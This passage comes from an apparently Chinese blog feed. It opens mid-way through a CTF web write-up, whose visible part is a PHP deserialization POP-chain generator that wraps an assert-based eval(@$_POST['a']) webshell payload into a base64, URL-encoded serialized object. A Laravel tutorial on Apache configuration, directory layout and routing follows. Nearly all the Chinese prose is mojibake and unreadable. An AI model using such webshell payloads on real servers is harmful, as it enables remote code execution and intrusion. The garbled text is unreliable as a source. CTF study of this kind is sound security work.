class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-comment">// private $length;</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$isRead</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$event</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-keyword">new</span> D();<br><span class="hljs-keyword">$this</span>-&gt;isRead = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;test&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>, <span class="hljs-string">&quot;toRead&quot;</span>));<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$server</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;server = <span class="hljs-keyword">new</span> A();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$param</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$curtain</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;param = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;show&quot;</span>=&gt;<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">$this</span>-&gt;curtain = <span class="hljs-keyword">$this</span>;<br><span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&#x27;eval(@$_POST[\&#x27;a\&#x27;])&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-keyword">new</span> C())));<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>laravelè¯¦ç»†å­¦ä¹ </title>
    <link href="/2021/07/04/2020-7-4-laravel%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/04/2020-7-4-laravel%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="laravelè¯¦ç»†å­¦ä¹ "><a href="#laravelè¯¦ç»†å­¦ä¹ " class="headerlink" title="laravelè¯¦ç»†å­¦ä¹ "></a>laravelè¯¦ç»†å­¦ä¹ </h2><p>[TOC]</p><h4 id="apacheé…ç½®"><a href="#apacheé…ç½®" class="headerlink" title="apacheé…ç½®"></a>apacheé…ç½®</h4><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment"># Virtual Hosts</span><br><br><span class="hljs-comment">#</span><br>&lt;VirtualHost *:<span class="hljs-number">80</span>&gt;<br>  ServerName localhost <span class="hljs-comment">#è¿™å¥æ˜¯è‡ªå·±éšæ„å–çš„åŸŸå</span><br>  ServerAlias localhost<span class="hljs-comment">#æœåŠ¡å™¨åˆ«å</span><br>  DocumentRoot <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;INSTALL_DIR&#125;</span>/www&quot;</span><span class="hljs-comment">#ç½‘ç«™æ ¹ç›®å½•INSTALL_DIRå³ä¸ºå®‰è£…ç›®å½•</span><br>  &lt;Directory <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;INSTALL_DIR&#125;</span>/www/&quot;</span>&gt;<br>    Options +Indexes +Includes +FollowSymLinks +MultiViews  <span class="hljs-comment">#æ ¹ç›®å½•æ˜¾ç¤ºç›®å½•ç»“æ„</span><br>    AllowOverride All <span class="hljs-comment"># é‡å†™è§„åˆ™çš„å®šä¹‰.é€‚ç”¨äºæ‰€æœ‰æ–‡ä»¶çš„è®¿é—®.</span><br>    Require <span class="hljs-keyword">local</span><br>  &lt;/Directory&gt;<br>&lt;/VirtualHost&gt;<br></code></pre></div></td></tr></table></figure><h4 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>laravelæ˜¯åŸºäºmvcæ¨¡å¼çš„phpæ¡†æ¶ï¼Œmâ€”â€”æ¨¡å‹å±‚ï¼Œvâ€”â€”è§†å›¾å±‚ï¼Œcâ€”â€”æ§åˆ¶å™¨å±‚ï¼›ä»¥ä¸‹ä¸ºlaravelæ¡†æ¶çš„ç›®å½•æ–‡ä»¶ï¼Œæ¡†å‡ºæ¥çš„æ–‡ä»¶ç›®å½•å°†åœ¨åç»­ä¸­ç”¨åˆ°</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">ï½œâ€“ã€€app åŒ…å«Controllerã€Modelã€è·¯ç”±ç­‰åœ¨å†…çš„åº”ç”¨ç›®å½•ï¼Œå¤§éƒ¨åˆ†ä¸šåŠ¡å°†åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œ<br>    ï½œã€€ã€€ï½œâ€“ã€€Console å‘½ä»¤è¡Œç¨‹åºç›®å½•<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€Commands åŒ…å«äº†ç”¨äºå‘½ä»¤è¡Œæ‰§è¡Œçš„ç±»ï¼Œå¯åœ¨è¯¥ç›®å½•ä¸‹è‡ªå®šä¹‰ç±»<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€Kernel.php å‘½ä»¤è°ƒç”¨å†…æ ¸æ–‡ä»¶ï¼ŒåŒ…å«commandså˜é‡(å‘½ä»¤æ¸…å•ï¼Œè‡ªå®šä¹‰çš„å‘½ä»¤éœ€åŠ å…¥åˆ°è¿™é‡Œ)å’Œscheduleæ–¹æ³•(ç”¨äºä»»åŠ¡è°ƒåº¦ï¼Œå³å®šæ—¶ä»»åŠ¡)<br>    ï½œã€€ã€€ï½œâ€“ã€€Events äº‹ä»¶ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€Exceptions åŒ…å«äº†è‡ªå®šä¹‰é”™è¯¯å’Œå¼‚å¸¸å¤„ç†ç±»<br>    ï½œã€€ã€€ï½œâ€“ã€€Http HTTPä¼ è¾“å±‚ç›¸å…³çš„ç±»ç›®å½•<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€Controllers æ§åˆ¶å™¨ç›®å½•<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€Middleware ä¸­é—´ä»¶ç›®å½•<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€Requests è¯·æ±‚ç±»ç›®å½•<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€Kernel.php åŒ…å«httpä¸­é—´ä»¶å’Œè·¯ç”±ä¸­é—´ä»¶çš„å†…æ ¸æ–‡ä»¶<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€routes.php å¼ºå¤§çš„è·¯ç”±<br>    ï½œã€€ã€€ï½œâ€“ã€€Jobs è¯¥ç›®å½•ä¸‹åŒ…å«é˜Ÿåˆ—çš„ä»»åŠ¡ç±»<br>    ï½œã€€ã€€ï½œâ€“ã€€Listeners ç›‘å¬å™¨ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€Providers æœåŠ¡æä¾›è€…ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€User.php è‡ªå¸¦çš„æ¨¡å‹å®ä¾‹ï¼Œæˆ‘ä»¬æ–°å»ºçš„Modelé»˜è®¤ä¹Ÿå­˜å‚¨åœ¨è¯¥ç›®å½•<br>    ï½œâ€“ã€€bootstrap æ¡†æ¶å¯åŠ¨è½½å…¥ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€app.php åˆ›å»ºæ¡†æ¶åº”ç”¨å®ä¾‹<br>    ï½œã€€ã€€ï½œâ€“ã€€autoload.php è‡ªåŠ¨åŠ è½½<br>    ï½œã€€ã€€ï½œâ€“ã€€cache å­˜æ”¾æ¡†æ¶å¯åŠ¨ç¼“å­˜ï¼ŒwebæœåŠ¡å™¨éœ€è¦æœ‰è¯¥ç›®å½•çš„å†™å…¥æƒé™<br>    ï½œâ€“ã€€config å„ç§é…ç½®æ–‡ä»¶çš„ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€app.php ç³»ç»Ÿçº§é…ç½®æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€auth.php ç”¨æˆ·èº«ä»½è®¤è¯é…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šå¥½tableå’Œmodelå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç”¨èº«ä»½è®¤è¯åŠŸèƒ½äº†<br>    ï½œã€€ã€€ï½œâ€“ã€€broadcasting.php äº‹ä»¶å¹¿æ’­é…ç½®æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€cache.php ç¼“å­˜é…ç½®æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€compile.php ç¼–è¯‘é¢å¤–æ–‡ä»¶å’Œç±»éœ€è¦çš„é…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬ç”¨æˆ·å¾ˆå°‘ç”¨åˆ°<br>    ï½œã€€ã€€ï½œâ€“ã€€database.php æ•°æ®åº“é…ç½®æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€filesystems.php æ–‡ä»¶ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œå¯ä»¥é…ç½®äº‘å­˜å‚¨å‚æ•°<br>    ï½œã€€ã€€ï½œâ€“ã€€mail.php ç”µå­é‚®ä»¶é…ç½®æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€queue.php æ¶ˆæ¯é˜Ÿåˆ—é…ç½®æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€services.php å¯å­˜æ”¾ç¬¬ä¸‰æ–¹æœåŠ¡çš„é…ç½®ä¿¡æ¯<br>    ï½œã€€ã€€ï½œâ€“ã€€session.php é…ç½®sessionçš„å­˜å‚¨æ–¹å¼ã€ç”Ÿå‘½å‘¨æœŸç­‰ä¿¡æ¯<br>    ï½œã€€ã€€ï½œâ€“ã€€view.php æ¨¡æ¿æ–‡ä»¶é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«æ¨¡æ¿ç›®å½•å’Œç¼–è¯‘ç›®å½•ç­‰<br>    ï½œâ€“ã€€database æ•°æ®åº“ç›¸å…³ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€factories <span class="hljs-number">5.1</span>ä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§ï¼Œå·¥å‚ç±»ç›®å½•ï¼Œä¹Ÿæ˜¯ç”¨äºæ•°æ®å¡«å……<br>    ï½œã€€ã€€ï½œã€€ã€€ï½œâ€“ã€€ModelFactory.php åœ¨è¯¥æ–‡ä»¶å¯å®šä¹‰ä¸åŒModelæ‰€éœ€å¡«å……çš„æ•°æ®ç±»å‹<br>    ï½œã€€ã€€ï½œâ€“ã€€migrations å­˜å‚¨æ•°æ®åº“è¿ç§»æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€seeds å­˜æ”¾æ•°æ®å¡«å……ç±»çš„ç›®å½•<br>    ï½œã€€ã€€ã€€ã€€ã€€ï½œâ€“ã€€DatabaseSeeder.php æ‰§è¡Œphp artisan db:seedå‘½ä»¤å°†ä¼šè°ƒç”¨è¯¥ç±»çš„runæ–¹æ³•ã€‚è¯¥æ–¹æ³•å¯è°ƒç”¨æ‰§è¡Œè¯¥ç›®å½•ä¸‹å…¶ä»–Seederç±»ï¼Œä¹Ÿå¯è°ƒç”¨factoriesæ–¹æ³•ç”ŸæˆModelFactoryé‡Œå®šä¹‰çš„æ•°æ®æ¨¡å‹<br>    ï½œâ€“ã€€<span class="hljs-keyword">public</span> ç½‘ç«™å…¥å£ï¼Œåº”å½“å°†ipæˆ–åŸŸåæŒ‡å‘è¯¥ç›®å½•è€Œä¸æ˜¯æ ¹ç›®å½•ã€‚å¯ä¾›å¤–éƒ¨è®¿é—®çš„cssã€jså’Œå›¾ç‰‡ç­‰èµ„æºçš†æ”¾ç½®äºæ­¤<br>    ï½œã€€ã€€ï½œâ€“ã€€index.php å…¥å£æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€.htaccess ApacheæœåŠ¡å™¨ç”¨è¯¥æ–‡ä»¶é‡å†™URL<br>    ï½œã€€ã€€ï½œâ€“ã€€web.config IISæœåŠ¡å™¨ç”¨è¯¥æ–‡ä»¶é‡å†™URL<br>    ï½œâ€“ã€€resources èµ„æºæ–‡ä»¶ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€assets å¯å­˜æ”¾åŒ…å«LESSã€SASSã€CoffeeScriptåœ¨å†…çš„åŸå§‹èµ„æºæ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€lang æœ¬åœ°åŒ–æ–‡ä»¶ç›®å½•<br>    ï½œã€€ã€€ï½œâ€“ã€€views è§†å›¾æ–‡ä»¶å°±æ”¾åœ¨è¿™å•¦<br>    ï½œâ€“ã€€storage å­˜å‚¨ç›®å½•ã€‚webæœåŠ¡å™¨éœ€è¦æœ‰è¯¥ç›®å½•åŠæ‰€æœ‰å­ç›®å½•çš„å†™å…¥æƒé™<br>    ï½œã€€ã€€ï½œâ€“ã€€app å¯ç”¨äºå­˜å‚¨åº”ç”¨ç¨‹åºæ‰€éœ€çš„ä¸€äº›æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€framework è¯¥ç›®å½•ä¸‹åŒ…æ‹¬ç¼“å­˜ã€sessionså’Œç¼–è¯‘åçš„è§†å›¾æ–‡ä»¶<br>    ï½œã€€ã€€ï½œâ€“ã€€logs æ—¥å¿—ç›®å½•<br>    ï½œâ€“ã€€tests æµ‹è¯•ç›®å½•<br>    ï½œâ€“ã€€vendor è¯¥ç›®å½•ä¸‹åŒ…å«Laravelæºä»£ç å’Œç¬¬ä¸‰æ–¹ä¾èµ–åŒ…<br>    ï½œâ€“ã€€.env ç¯å¢ƒé…ç½®æ–‡ä»¶ã€‚configç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ä¼šä½¿ç”¨è¯¥æ–‡ä»¶é‡Œé¢çš„å‚æ•°ï¼Œä¸åŒç”Ÿäº§ç¯å¢ƒä½¿ç”¨ä¸åŒçš„.envæ–‡ä»¶å³å¯ã€‚<br>    ï½œâ€“ã€€artisan å¼ºå¤§çš„å‘½ä»¤è¡Œæ¥å£ï¼Œä½ å¯ä»¥åœ¨app/Console/Commandsä¸‹ç¼–å†™è‡ªå®šä¹‰å‘½ä»¤<br>    ï½œâ€“ã€€composer.json å­˜æ”¾ä¾èµ–å…³ç³»çš„æ–‡ä»¶<br>    ï½œâ€“ã€€composer.lock é”æ–‡ä»¶ï¼Œå­˜æ”¾å®‰è£…æ—¶ä¾èµ–åŒ…çš„çœŸå®ç‰ˆæœ¬<br>    ï½œâ€“ã€€gulpfile.js gulpï¼ˆä¸€ç§å‰ç«¯æ„å»ºå·¥å…·ï¼‰é…ç½®æ–‡ä»¶<br>    ï½œâ€“ã€€package.json gulpé…ç½®æ–‡ä»¶<br>    ï½œâ€“ã€€phpspec.yml phpspecï¼ˆä¸€ç§PHPæµ‹è¯•æ¡†æ¶ï¼‰é…ç½®æ–‡ä»¶<br>    ï½œâ€“ã€€phpunit.xml phpunitï¼ˆä¸€ç§PHPæµ‹è¯•æ¡†æ¶ï¼‰é…ç½®æ–‡ä»¶<br>    ï½œâ€“ã€€server.php PHPå†…ç½®çš„WebæœåŠ¡å™¨å°†æŠŠè¿™ä¸ªæ–‡ä»¶ä½œä¸ºå…¥å£ã€‚ä»¥<span class="hljs-keyword">public</span>/index.phpä¸ºå…¥å£çš„å¯ä»¥å¿½ç•¥æ‰è¯¥æ–‡ä»¶<br></code></pre></div></td></tr></table></figure><p>appæ˜¯åº”ç”¨çš„æ ¸å¿ƒä»£ç æ–‡ä»¶ç›®å½•ï¼Œä»¥åçš„ä»£ç åŸºæœ¬éƒ½åœ¨è¿™é‡Œå®Œæˆï¼›app/Http/Controllerç›®å½•æ˜¯åº”ç”¨çš„æ§åˆ¶å™¨æ–‡ä»¶ï¼›routes.phpæ˜¯æ¡†æ¶çš„è·¯ç”±æ–‡ä»¶ï¼Œè´Ÿè´£è·¯ç”±åˆ†é…å’Œæ˜ å°„ï¼›Httpä¸‹çš„ç±»æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸Šé¢ç›®å½•ä¸­çš„User.phpã€Menu.phpæ–‡ä»¶æ˜¯åº”ç”¨çš„æ¨¡å‹æ–‡ä»¶ï¼›configç›®å½•æ˜¯æ‰€æœ‰åº”ç”¨çš„é…ç½®æ–‡ä»¶ç›®å½•ï¼›publicæ˜¯æ¡†æ¶çš„å…¥å£æ–‡ä»¶åŠé™æ€èµ„æºæ–‡ä»¶ç›®å½•ï¼›resources/viewsåˆ™æ˜¯åº”ç”¨çš„è§†å›¾æ–‡ä»¶ç›®å½•ã€‚</p><h2 id="å…³äºè·¯ç”±"><a href="#å…³äºè·¯ç”±" class="headerlink" title="å…³äºè·¯ç”±"></a>å…³äºè·¯ç”±</h2><p>åœ¨ Laravel åº”ç”¨ä¸­ï¼Œå®šä¹‰è·¯ç”±æœ‰ä¸¤ä¸ªå…¥å£ï¼Œä¸€ä¸ªæ˜¯ <code>routes/web.php</code>ï¼Œç”¨äºå¤„ç†ç»ˆç«¯ç”¨æˆ·é€šè¿‡ Web æµè§ˆå™¨ç›´æ¥è®¿é—®çš„è¯·æ±‚ï¼Œå¦ä¸€ä¸ªæ˜¯ <code>routes/api.php</code>ï¼Œ</p><p>getè¯·æ±‚å’Œpostè¯·æ±‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    Route::get(/test1,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;);<br>    Route::post(/test1,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;); <br>     <span class="hljs-comment">//ä¸¤ç§è®¿é—®æ–¹å¼é¡µé¢è¿”å›hello</span><br><br>Route::get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;WelcomeController@index&#x27;</span>); è®¿é—®/æ—¶è°ƒç”¨App\Http\Controllers\WelcomeController æ§åˆ¶å™¨çš„ index æ–¹æ³•<br>        <br></code></pre></div></td></tr></table></figure><p>å…³äºå¤šè·¯ç”±è®¿é—®æœ‰matchå’Œanyæ–¹å¼</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Route::match([<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>], <span class="hljs-string">&#x27;multi&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;multi post or get&#x27;</span>;<br>  &#125;);<br>Route::any(<span class="hljs-string">&#x27;multi&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;multi get or post&#x27;</span>;<br>  &#125;);<br></code></pre></div></td></tr></table></figure><h4 id="è·¯ç”±å‚æ•°"><a href="#è·¯ç”±å‚æ•°" class="headerlink" title="è·¯ç”±å‚æ•°"></a>è·¯ç”±å‚æ•°</h4><p>å¦‚æœä½ å®šä¹‰çš„è·¯ç”±éœ€è¦ä¼ é€’å‚æ•°ï¼Œåªéœ€è¦åœ¨è·¯ç”±è·¯å¾„ä¸­è¿›è¡Œæ ‡è¯†å¹¶å°†å…¶ä¼ é€’åˆ°é—­åŒ…å‡½æ•°å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;id&#125;&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”¨æˆ·ID: &quot;</span> . <span class="hljs-variable">$id</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>è¿™æ ·ï¼Œå½“ä½ è®¿é—® <code>http://blog.test/user/1000</code> çš„æ—¶å€™ï¼Œå°±å¯ä»¥åœ¨æµè§ˆå™¨çœ‹åˆ° <code>ç”¨æˆ·ID: 1000</code> å­—ç¬¦ä¸²ã€‚</p><p>æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥å®šä¹‰å¯é€‰çš„è·¯ç”±å‚æ•°ï¼Œåªéœ€è¦åœ¨å‚æ•°åé¢åŠ ä¸ª <code>?</code> æ ‡è¯†ç¬¦å³å¯ï¼ŒåŒæ—¶ä½ è¿˜å¯ä»¥ä¸ºå¯é€‰å‚æ•°æŒ‡å®šé»˜è®¤å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;id?&#125;&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$id</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”¨æˆ·ID: &quot;</span> . <span class="hljs-variable">$id</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>è¿™æ ·ï¼Œå¦‚æœä¸ä¼ é€’ä»»ä½•å‚æ•°è®¿é—® <code>http://blog.test/user</code>ï¼Œåˆ™ä¼šä½¿ç”¨é»˜è®¤å€¼ <code>1</code> ä½œä¸ºç”¨æˆ· IDã€‚æ›´æ·±å…¥çš„ç”¨æ³•è¿˜å¯ä»¥ç”¨æ­£åˆ™åŒ¹é…</p><h4 id="è·¯ç”±åˆ†ç»„"><a href="#è·¯ç”±åˆ†ç»„" class="headerlink" title="è·¯ç”±åˆ†ç»„"></a>è·¯ç”±åˆ†ç»„</h4><p>æ‰€è°“è·¯ç”±åˆ†ç»„ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ <code>Route::group</code> å°†å‡ ä¸ªè·¯ç”±èšåˆåˆ°ä¸€èµ·ï¼Œç„¶åç»™å®ƒä»¬åº”ç”¨å¯¹åº”çš„å…±äº«ç‰¹å¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::group([], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <br>    Route::get(<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello&#x27;</span>; &#125;); <br>    Route::get(<span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;World&#x27;</span>; &#125;); <br>&#125;);<br></code></pre></div></td></tr></table></figure><h4 id="è·¯ç”±åˆ«å"><a href="#è·¯ç”±åˆ«å" class="headerlink" title="è·¯ç”±åˆ«å"></a>è·¯ç”±åˆ«å</h4><p>ã€€ç»™è·¯ç”±é€šè¿‡[â€˜asâ€™ =&gt; â€˜aliasâ€™]æ•°ç»„ä½¿ç”¨åˆ«ååï¼Œå¯é€šè¿‡route(â€˜åˆ«åâ€™)ç”Ÿæˆurlï¼Œè¯·çœ‹ä»£ç ç†è§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <br> <span class="hljs-comment">//è·¯ç”±åˆ«å</span><br>  <br> Route::get(<span class="hljs-string">&#x27;student/info&#x27;</span>,[<span class="hljs-string">&#x27;as&#x27;</span> =&gt; <span class="hljs-string">&#x27;studentInfo&#x27;</span> ,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-comment">//é€šè¿‡route(&#x27;studentInfo&#x27;)ç”Ÿæˆå®Œæˆurlåè¿”å›</span><br>      <span class="hljs-keyword">return</span> route(<span class="hljs-string">&#x27;studentInfo&#x27;</span>);<br> &#125;]);<br> <br> <br> è®¿é—®urlï¼šhttp:<span class="hljs-comment">//127.0.0.1/laravel/public/student/info</span><br> é¡µé¢è¿”å›ï¼šhttp:<span class="hljs-comment">//127.0.0.1/laravel/public/student/info</span><br> 